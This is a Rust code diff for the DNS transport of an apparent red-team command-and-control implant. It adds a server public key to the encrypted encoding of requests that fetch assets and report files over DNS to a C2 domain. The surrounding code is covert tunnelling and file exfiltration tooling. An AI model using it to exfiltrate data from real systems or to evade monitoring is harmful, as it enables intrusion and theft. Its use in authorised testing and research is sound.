@@ -35,16 +35,17 @@ pub struct DNS {
     dns_servers: Vec<String>, // Primary + fallback DNS servers
     current_server_index: usize,
     record_type: DnsRecordType, // DNS record type to use for queries
+    server_pubkey: [u8; 32],
 }
 
 impl DNS {
     /// Marshal request using ChaCha encoding
-    fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
+    fn marshal_with_codec<Req, Resp>(msg: Req, server_pubkey: [u8; 32]) -> Result<Vec<u8>>
     where
         Req: Message + Send + 'static,
         Resp: Message + Default + Send + 'static,
     {
-        pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
+        pb::xchacha::encode_with_chacha::<Req, Resp>(msg, server_pubkey)
     }
 
     /// Unmarshal response using ChaCha encoding
@@ -375,7 +376,7 @@ impl DNS {
         Resp: Message + Default + Send + 'static,
     {
         // Marshal request
-        let request_data = Self::marshal_with_codec::<Req, Resp>(request)?;
+        let request_data = Self::marshal_with_codec::<Req, Resp>(request, self.server_pubkey)?;
 
         // Send raw bytes and unmarshal response
         let response_data = self.dns_exchange_raw(request_data, method_code).await?;
@@ -862,10 +863,11 @@ impl Transport for DNS {
             dns_servers: Vec::new(),
             current_server_index: 0,
             record_type: DnsRecordType::TXT,
+            server_pubkey: [0u8; 32], // Default pubkey for empty transport
         }
     }
 
-    fn new(callback: String, _proxy_uri: Option<String>) -> Result<Self> {
+    fn new(callback: String, _proxy_uri: Option<String>, server_pubkey: [u8; 32]) -> Result<Self> {
         // Parse DNS URL formats:
         // dns://server:port?domain=dnsc2.realm.pub&type=txt (single server, TXT records)
         // dns://*?domain=dnsc2.realm.pub&type=a (use system DNS + fallbacks, A records)
@@ -936,6 +938,7 @@ impl Transport for DNS {
             dns_servers,
             current_server_index: 0,
             record_type,
+            server_pubkey,
         })
     }
 
@@ -951,7 +954,7 @@ impl Transport for DNS {
         // Send fetch request and get raw response bytes
         let response_bytes = self
             .dns_exchange_raw(
-                Self::marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?,
+                Self::marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request, self.server_pubkey)?,
                 "/c2.C2/FetchAsset",
             )
             .await?;
@@ -1012,6 +1015,9 @@ impl Transport for DNS {
         &mut self,
         request: Receiver<ReportFileRequest>,
     ) -> Result<ReportFileResponse> {
+        // Capture server_pubkey before spawning
+        let server_pubkey = self.server_pubkey;
+
         // Spawn a task to collect chunks from the sync channel receiver
         // This is necessary because iterating over the sync receiver would block the async task
         let handle = tokio::spawn(async move {
@@ -1019,7 +1025,7 @@ impl Transport for DNS {
 
             for chunk in request {
                 let chunk_bytes =
-                    Self::marshal_with_codec::<ReportFileRequest, ReportFileResponse>(chunk)?;
+                    Self::marshal_with_codec::<ReportFileRequest, ReportFileResponse>(chunk, server_pubkey)?;
                 // Prefix each chunk with its length (4 bytes, big-endian)
                 all_chunks.extend_from_slice(&(chunk_bytes.len() as u32).to_be_bytes());
                 all_chunks.extend_from_slice(&chunk_bytes);
